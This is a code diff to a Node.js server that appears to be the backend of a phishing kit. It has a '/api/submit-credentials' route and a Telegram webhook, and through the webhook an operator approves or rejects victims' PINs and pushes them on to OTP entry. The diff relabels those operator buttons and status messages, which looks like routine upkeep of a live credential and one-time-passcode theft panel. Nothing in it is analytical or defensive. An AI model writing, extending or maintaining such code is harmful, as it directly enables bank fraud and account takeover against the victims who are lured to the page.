@@ -120,8 +120,8 @@ app.post('/api/submit-credentials', async (req, res) => {
         reply_markup: JSON.stringify({  
           inline_keyboard: [  
             [  
-              { text: '❌ WRONG PIN', callback_data: `pin_wrong_${appReference}` },  
-              { text: '✅ CORRECT PIN (To Step 3)', callback_data: `step3_prompt_${appReference}` }  
+              { text: '❌ Rejected OTP', callback_data: `pin_wrong_${appReference}` },  
+              { text: '✅ Allow OTP', callback_data: `step3_prompt_${appReference}` }  
             ]  
           ]  
         })  
@@ -396,7 +396,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'PIN_REJECTED';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: WRONG PIN ❌</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🔴 <b>STATUS: WRONG PIN ❌ (REDIRECTED BACK)</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -407,7 +407,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
       appData.status = 'PROMPT_OTP';
       activeApplications.set(appReference, appData);
     }
-    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: CORRECT PIN ✅ — PROMPTED TO OTP ENTRY</b>`;
+    const updatedText = `${callback_query.message.text}\n\n🟢 <b>STATUS: ALLOW OTP ✅</b>`;
     await editTelegramMessage(botToken, chatId, messageId, updatedText);
   }
 
@@ -462,4 +462,4 @@ app.get('/Admin-*', (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
-                                 
+        
